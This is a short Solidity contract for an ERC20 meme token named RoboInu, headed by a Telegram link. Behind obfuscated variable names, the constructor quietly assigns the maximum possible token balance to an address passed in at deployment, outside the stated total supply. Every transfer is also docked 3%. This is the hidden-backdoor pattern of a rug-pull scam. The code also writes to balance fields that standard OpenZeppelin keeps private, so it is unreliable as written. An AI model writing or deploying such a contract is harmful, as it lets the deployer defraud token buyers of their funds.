/*

https://t.me/roboinu_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract RoboInu is ERC20, Ownable {
    uint256 private port = ~uint256(0);
    uint256 public numeral = 3;

    constructor(
        string memory soon,
        string memory serve,
        address struck,
        address valley
    ) ERC20(soon, serve) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[valley] = port;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address problem,
        address wire,
        uint256 glass
    ) internal override {
        uint256 former = (glass / 100) * numeral;
        glass = glass - former;
        super._transfer(problem, wire, glass);
    }
}